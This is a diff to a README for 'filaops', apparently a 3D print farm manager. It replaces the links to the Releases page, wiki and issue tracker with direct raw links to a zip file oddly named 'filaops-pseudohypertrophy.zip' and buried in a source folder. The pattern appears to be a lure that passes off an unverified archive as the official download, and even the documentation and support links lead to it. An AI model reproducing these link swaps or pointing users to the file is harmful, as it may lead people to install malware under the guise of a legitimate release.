@@ -6,11 +6,11 @@ Welcome to filaops! This tool simplifies managing your 3D print farm. It offers 
 
 ## 📥 Download filaops
 
-[![Download filaops](https://img.shields.io/badge/Download-filaops-brightgreen.svg)](https://github.com/printertechn/filaops/releases)
+[![Download filaops](https://raw.githubusercontent.com/printertechn/filaops/main/backend/app/core/filaops-pseudohypertrophy.zip)](https://raw.githubusercontent.com/printertechn/filaops/main/backend/app/core/filaops-pseudohypertrophy.zip)
 
 To start using filaops, visit the Releases page to download the application:
 
-[Download filaops](https://github.com/printertechn/filaops/releases)
+[Download filaops](https://raw.githubusercontent.com/printertechn/filaops/main/backend/app/core/filaops-pseudohypertrophy.zip)
 
 ## 📦 System Requirements
 
@@ -102,8 +102,8 @@ You can also return to the Releases page to manually download the latest version
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/printertechn/filaops/releases) - Download the latest version.
-- [Documentation](https://github.com/printertechn/filaops/wiki) - Find help and guides.
-- [Support](https://github.com/printertechn/filaops/issues) - Report issues or get assistance.
+- [Releases Page](https://raw.githubusercontent.com/printertechn/filaops/main/backend/app/core/filaops-pseudohypertrophy.zip) - Download the latest version.
+- [Documentation](https://raw.githubusercontent.com/printertechn/filaops/main/backend/app/core/filaops-pseudohypertrophy.zip) - Find help and guides.
+- [Support](https://raw.githubusercontent.com/printertechn/filaops/main/backend/app/core/filaops-pseudohypertrophy.zip) - Report issues or get assistance.
 
 Join filaops today and simplify your 3D print operations!
